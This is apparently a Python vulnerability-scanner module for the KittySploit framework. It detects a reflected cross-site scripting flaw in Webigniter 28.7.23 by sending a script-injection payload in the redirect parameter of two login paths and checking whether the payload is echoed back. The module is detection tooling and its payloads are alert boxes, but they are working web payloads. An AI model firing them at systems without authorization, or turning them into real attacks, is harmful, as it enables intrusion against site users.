#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsu."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Webigniter 28.7.23 - Cross-Site Scripting Detection',
        'description': 'The value of the redirect request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload ycsz3"><script>alert(1)</script>bn76w was submitted in the redirect parameter. This input was echoed unmodified in the application\'s response. By using this Java Script injection, the attacker can trick a lot of users into visiting his dangerous URL which is reflected on the login form, before they log in, warning them that there is a problem with the login',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'webigniter', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/WEBIGniter/2023/WEBIGniter-28.7.23-XSS-Reflected',
            'https://webigniter.net',
        ],
    }

    def run(self):
        for path in ('/cms/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w', '/login?redirect=cmsycsz3%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2fscript>bn76w'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<script>alert(document.domain)</script>', 'Webigniter',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Webigniter 28.7.23 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

